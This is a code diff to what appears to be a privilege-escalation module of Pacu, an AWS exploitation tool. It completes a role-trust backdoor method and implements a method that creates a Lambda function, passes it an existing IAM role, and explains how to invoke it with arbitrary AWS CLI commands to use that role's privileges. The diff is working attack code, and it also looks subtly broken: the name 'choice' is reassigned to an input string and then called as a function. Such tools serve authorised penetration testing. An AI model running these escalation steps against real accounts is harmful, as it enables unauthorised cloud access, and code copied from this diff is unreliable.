@@ -1325,6 +1325,8 @@ def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
         if fetch_data(['Backdooring Roles'], 'backdoor_assume_role', '--role-names {}'.format(target_role), force=True) is False:
             print('Pre-req module not run successfully. Exiting...')
             return False
+        print('Successfully updated the assume-role-policy-document for role {}. You should now be able to assume that role to gain its privileges.\n'.format(target_role))
+        return True
     except Exception as error:
         print('Failed to update the assume-role-policy-document for role {}: {}\n'.format(target_role, error))
         again = input('    Do you want to try another role (y) or continue to the next privilege escalation method (n)? ')
@@ -1336,7 +1338,75 @@ def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
 
 
 def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method PassExistingRoleToNewLambdaThenInvoke...\n')
+    
+    regions = pacu_main.get_regions('lambda')
+    region = None
+
+    if len(regions) > 1:
+        print('  Found multiple valid regions. Choose one below.\n')
+        for i in range(0, len(regions)):
+            print('  [{}] {}'.format(i, regions[i]))
+        choice = input('What region do you want to create the Lambda function in? ')
+        region = regions[int(choice)]
+    elif len(regions) == 1:
+        region = regions[0]
+    else:
+        while not region:
+            all_lambda_regions = pacu_main.get_regions('lambda', check_session=False)
+            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+            if not region:
+                return False
+            elif region not in all_lambda_regions:
+                print('    Region {} is not a valid Lambda region. Please choose a valid region. Valid Lambda regions include:\n'.format(region))
+                print(all_lambda_regions)
+                region = None
+
+    client = pacu_main.get_boto3_client('lambda', region)
+
+    target_role_arn = input('    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+
+    if not target_role_arn:
+        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return False
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role_arn = roles[int(choice)]['Arn']
+
+    print('Using role {}. Trying to create a new Lambda function...'.format(target_role_arn))
+    
+    function_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    
+    with open('./modules/{}/lambda.zip'.format(module_info['Name']), 'rb') as f:
+        lambda_zip = f.read()
+
+    try:
+        response = client.create_function(
+            FunctionName=function_name,
+            Runtime='python3.6',
+            Role=target_role_arn,
+            Code={
+                'ZipFile': lambda_zip
+            },
+            Timeout=30,
+            Handler='lambda_function.lambda_handler'
+        )
+        print('Successfully created a Lambda function {} in region {}!'.format(function_name, region))
+        print('To make use of the new privileges, you need to invoke the newly created function. The function accepts input in the format as follows:\n\n{"cmd": "<aws cli command>"}\n\nWhen invoking the function, pass that JSON object as input, but replace <aws cli command> with an AWS CLI command that you would like to execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has S3 privileges, so you invoke this newly created Lambda function with the input {"cmd": "aws s3 ls"} and it will respond with all the buckets in the account.')
+        print('Example AWS CLI command to invoke the new Lambda function and execute "aws s3 ls" can be seen here:\n')
+        print('aws lambda invoke --function-name {} --region {} --payload file://payload.json --profile CurrentAWSKeys Out.txt\n'.format(function_name, region))
+        print('The file "payload.json" would include this object: {"cmd": "aws s3 ls"}. The results of the API call will be stored in ./Out.txt as well.\n')
+        return True
+    except Exception as error:
+        print('Failed to create the Lambda function {}: {}\n'.format(function_name, error))
+        return False
 
 
 def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input, fetch_data):
